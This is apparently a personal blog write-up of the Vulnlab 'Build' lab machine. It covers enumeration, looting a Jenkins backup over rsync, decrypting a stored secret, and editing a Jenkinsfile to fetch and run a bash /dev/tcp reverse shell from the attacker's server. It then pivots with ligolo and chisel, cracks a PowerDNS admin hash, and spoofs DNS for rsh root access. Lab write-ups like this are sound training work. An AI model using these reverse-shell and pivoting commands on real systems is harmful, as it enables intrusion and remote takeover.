+++
title = '[Vulnlab] Build - A tale of ancient protocols'
date = 2024-10-25T20:59:42+02:00
draft = false
tags = ['pentesting', 'linux']
+++
[![Proof](/images/vulnlab_build/banner.png)](https://api.vulnlab.com/api/v1/share?id=5ffff976-96e5-47df-a528-11125b41762f)

<!-- The difference between linux machines (in ctf-like scenarios)
is that they are more "Port"-heavy than windows machines. -->

In this machine it's very important to keep taking notes.

# 0. Enumeration
Since it's a Linux machine, we start with a `nmap` scan.
```bash
nmap -iL ips.txt -v -o normal
...
PORT     STATE    SERVICE
22/tcp   open     ssh
53/tcp   open     domain
512/tcp  open     exec
513/tcp  open     login
514/tcp  open     shell
873/tcp  open     rsync
3000/tcp open     ppp
3306/tcp filtered mysql
8081/tcp filtered blackice-icecap
```

Let's start clicking through [HackTricks](hacktricks.xyz) and start taking notes:
```
22 - SSH: Requires credentials or SSH-Key
53 - DNS: [Now] - Subdomain-enumeration
512,513 - Rexec, Rlogin - Requires credentials
514 Rsh - Interesting!
873 Rsync - Interesting!
3000 ??? - Interesting!
3306, 8081 -> Seem to be behind firewall.
```

Let's look at the ports one by one:

## 53 - DNS
Since there is just one target machine, we mostly look for interesting subdomains:
```bash
dig any build.vl @"$IP"
```
![DNS](/images/vulnlab_build/dns.png)

`hostmaster` seems to be the default value for a SOA record and therefore not interesting

## 514 - Rsh
The command
```bash
rsh -l root "$IP"              
Password: 
Password: 
Login incorrect
```
fails.

However, on [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-rsh), it's noted to keep
looking for the `.rhosts` and `/etc/hosts.equiv` files.

## 873 - Rsync
To list rsync files the following command can be used:
```bash
rsync --list-only rsync://"$IP"
backups        	backups
```
There is a `backups` rsync module. Very interesting!

## 3000 - HTTP
Whatweb reveals that we are dealing with a `Gitea` instance:
```bash
whatweb "$IP":3000     
http://10.10.122.159:3000 [200 OK] ...  Title[Gitea: Git with a cup of tea]
```

This can be confirmed by visiting the site via
```bash
firefox "$IP":3000 &> /dev/null &
```
![Gitea Site](/images/vulnlab_build/gitea.png)

There might be some secrets on the site, which might be even more interesting with credentials.


## Enumeration Conclusion
Let's gather our notes again:
```
Services to look at:
    1. 873 - Rsync -> Check out backups
    2. 3000 - Enumerate gitea
Look out for .rhosts file:
    542 - Rsh
Requires firewall bypass:
    3306, 8081
Take a look when credentials:
    SSH, Rexec, Rlogin, Gitea

Information:
* There is a DNS Server running
```

# 1. Looting rsync
Let's loot the rsync service:
```bash
rsync --list-only rsync://"$IP"/backups
drwxr-xr-x          4,096 2024/05/02 15:26:31 .
-rw-r--r--    376,289,280 2024/05/02 15:26:19 jenkins.tar.gz
```
A tar archive! Let's look inside!
```bash
mkdir loot
rsync -avP rsync://"$IP"/backups loot               
cd loot
tar -xvf jenkins.tar.gz
```

![jenkins_configuration](/images/vulnlab_build/jenkins_configuration.png)

## Jenkins secrets
[HackTricks](https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security) again comes to our aid and tells us where
to look for secrets:

```bash
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<" -C 2
```
![Jenkins encrypted secret](/images/vulnlab_build/jenkins_enc.png)
1. We now know the username `buildadm`
2. An encrypted secret is located at `jenkins_configuration/jobs/build/config.xml`

Using the script [jenkins_offline_decrypt.py](https://github.com/gquere/pwn_jenkins/blob/master/offline_decryption/jenkins_offline_decrypt.py), we get the password.
```bash
jenkins_offline_decrypt.py $(find . -name master.key) $(find . -name hudson.util.Secret) jenkins_configuration/jobs/build/config.xml
G******!
```

# 2. Checking Gitea at Port 3000
Let's check our notes:
```bash
Services to look at:
    1. 3000 - Enumerate gitea
Look out for .rhosts file:
    542 - Rsh
Requires firewall bypass:
    3306, 8081
Take a look when credentials:
    SSH, Gitea

Credentials:
buildadm:G*******!

Information:
* There is a DNS Server running
* There was a Jenkins configuration
```

We try the credentials on both the SSH server and on Gitea.

On Gitea we are successful.
![alt text](/images/vulnlab_build/login.png)
<!-- ![alt text](/images/vulnlab_build/success.png) -->

At 
```
http://10.10.98.84:3000/buildadm/dev/src/branch/main/Jenkinsfile
```
We find the only file that's located in the repository.
A [Jenkinsfile](https://www.jenkins.io/doc/book/pipeline/jenkinsfile/) defines a pipeline that can be easily modified
to a [Reverse Shell](https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security/jenkins-rce-creating-modifying-pipeline)

We deploy the following `index.html` on our HTTP server:
```
/bin/bash -c '/bin/bash -i > /dev/tcp/10.8.3.211/4444 0<&1 2>&1'
```

And deploy the reverse shell on the host:
```jenkins
pipeline {
    agent any

    stages {
        stage('Do nothing') {
            steps {
                sh 'curl 10.8.3.211|sh'
            }
        }
    }
}
```
On the host we activate our reverse shell listener
```bash
penelope.py -m 3 -i tun0
```
Which leads to a nice shell!

![Reverse Shell](/images/vulnlab_build/reverse_shell.png)

The user flag is in `/root/user.txt`

# 3. Docker enumeration
The random hostname as well as `/.dockerenv` file confirm that we are in a docker environment.

Let's take out our notes:
```
Look out for .rhosts file:
    542 - Rsh
Requires firewall bypass:
    3306, 8081
Take a look when credentials:
    SSH
```

## .rhosts
Using `find` we quickly locate the `.rhosts` file:

```bash
$ find / -name .rhosts
/root/.rhosts
$ cat /root/.rhosts
admin.build.vl +
intern.build.vl +
```

Since there is no `rsh` listener on the docker container, we can 
assume that the configuration is on the root server.
Therefore, we can attempt to spoof our IP to `admin.build.vl` when we figure out which IP addresses those resolve to.

## Firewall bypass
Now that we have code execution inside the network, we can
use `ligolo` to connect to the network from inside.

Using penelope session
```
upload /opt/tools/ligolo-ng/agent
```
On Host
```
ligolo-ng -selfcert
```
Client
```bash
./agent -connect $ATTACKER_IP:11601 -v -accept-fingerprint $FINGERPRINT
```
On ligolo session
```bash
session
autoroute
```

The connection is successful:
![Connection successful](/images/vulnlab_build/ligolo_client.png)

And we have a new interface `172.18.0.3/16` on our host
that directly tunnels to the server:
![Server Connection successful](/images/vulnlab_build/ligolo_server.png)

# 4. Internal services
To locate the internal services, we scan the internal network on the top 100 ports:
```
nmap -F 172.18.0.1/24 -v -oA internal
```

The output is:
```
Nmap scan report for 172.18.0.1
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
513/tcp  open  login
514/tcp  open  shell
873/tcp  open  rsync
3000/tcp open  ppp
3306/tcp open  mysql
8081/tcp open  blackice-icecap

Nmap scan report for 172.18.0.2
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp

Nmap scan report for 172.18.0.3
PORT     STATE SERVICE
8080/tcp open  http-proxy

Nmap scan report for 172.18.0.4
PORT     STATE SERVICE
3306/tcp open  mysql

Nmap scan report for 172.18.0.5
PORT     STATE SERVICE
53/tcp   open  domain
8081/tcp open  blackice-icecap

Nmap scan report for 172.18.0.6
PORT   STATE SERVICE
80/tcp open  http
```

Clicking through the IPS and services we can conclude:

* `172.18.0.1` : the original host due to it having the same services.
* `172.18.0.2` : Mirror of the Gitea instance
* `172.18.0.3` : Docker with Jenkins
* `172.18.0.4` : Mirror of MySQL
* `172.18.0.5` : PowerDNS webserver API - find out via `whatweb`
* `172.18.0.6` : PowerDNS-Admin

Let's update our notes:
```
Services:
    172.18.0.1:3306 - MYSQL
    172.18.0.6:80 - PowerDNS - Admin dashboard
Requires us to be `admin.build.vl` or `internal.build.vl`
    514 - rsh
```

## MySQL
Immediately connecting to the MySQL database fails:
```
$ mysql -u root -h 172.18.0.4
ERROR 2013 (HY000): Lost connection to server at 'handshake: reading initial communication packet', system error: 11
```

Googling this error informs us that it might be a connection issue.

We can fix that by doing a direct port forward without ligolo or socks shenanigans:

On Host
```bash
chisel server --port 8888 --reverse
```
On victim
```bash
./chisel client $ATTACKER_IP:8888 R:127.0.0.1:3306:172.18.0.1:3306 &
```

Now it's possible to connect to the MySQL Database:
```bash
mysql -u root -h 127.0.0.1
```

![MySQL](/images/vulnlab_build/mysql.png)

In the table `powerdnsadmin.user` we can find the admin password for PowerDNS admin:

```
select * from powerdnsadmin.user;
```

![Mysql](/images/vulnlab_build/adminhash.png)

This password is crackable with `john` and gives us the credentials for PowerDNS:
```
admin:w*****n
```

# 5. Add DNS-entry for victory

Now let's look at our notes:
```bash
Requires us to be `admin.build.vl` or `internal.build.vl`
    514 - rsh
```

With the PowerDNS dashboard, we can add a DNS entry pointing to 
the attacker machine for `admin.build.vl`

![DNS entry](/images/vulnlab_build/DNS-entry.png)

Which then allows us to use 
```
rsh -l root "$IP"
```
from the attacker machine to win:
![RSH win](/images/vulnlab_build/RSHwin.png)

# Rabbit holes

## 1. bcrypt password hash in Jenkins
There is a bcrypt password hash in the Jenkins folder
```bash
grep password -r --include="*.xml"
jenkins_configuration/users/admin_8569439066427679502/config.xml:      <passwordHash>#jbcrypt:$2a$10$PaXdGyit8MLC9CEPjgw15.6x0GOIZNAk2gYUTdaOB6NN/9CPcvYrG</passwordHash>
[...]
```
However, the password: `G******!` is not in `rockyou.txt` and bcrypt cracks at slow rate of `165 hashes/s`, so this was not helpful

## 2. SSH file in docker container
There is an SSH file in the docker container on `/root/.ssh/id_ed25519`

Using `ssh2john.py`, we discover that the ssh file is protected with the passphrase `coffee`.

However, neither the SSH file nor the password are used for the machine.
